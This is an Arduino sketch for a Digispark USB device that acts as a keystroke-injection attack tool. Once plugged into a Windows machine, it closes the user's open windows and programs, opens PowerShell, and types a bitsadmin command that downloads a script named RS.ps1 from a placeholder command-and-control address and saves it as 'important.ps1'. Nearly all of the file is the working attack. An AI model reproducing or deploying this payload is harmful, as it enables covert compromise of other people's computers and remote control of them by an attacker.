/*
Copyright (c) 2019 Hassan Shehata
Permission is hereby granted, free of charge, 
to any person obtaining a copy of this software and associated documentation files
(the "Software"), to deal in the Software without restriction, 
including without limitation the rights to use, copy, modify, merge, 
publish, distribute, sublicense, and/or sell copies of the Software,
and to permit persons to whom the Software is furnished to do so
*/

#include "DigiKeyboard.h" //importing keyboard library
void setup() {
}

void loop() {
  //Persistance for windows only
  //Windows Payload
  DigiKeyboard.sendKeyStroke(0); //initialization
  DigiKeyboard.sendKeyStroke(KEY_W, MOD_CONTROL_LEFT); // close opened windows (cleaning effect of linux payload)
  delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);// close opened programs (cleaning effect of linux payload)
  delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // press windowsKey+R opens Run
  delay(1000);
  DigiKeyboard.print("powershell"); // write powershell 
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // opens powershell
  delay(1000);
  DigiKeyboard.print("bitsadmin /transfer C https://xx.xx.xx.xx/RS.ps1 C:\users\$env:UserName\important.ps1"); // repalce Xs with CnC IP/Domain to retrieve the payload over SSL
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // execute the RS.ps1
  for (;;) {
    // stops re-execution // just remove the Digispark
  }
}
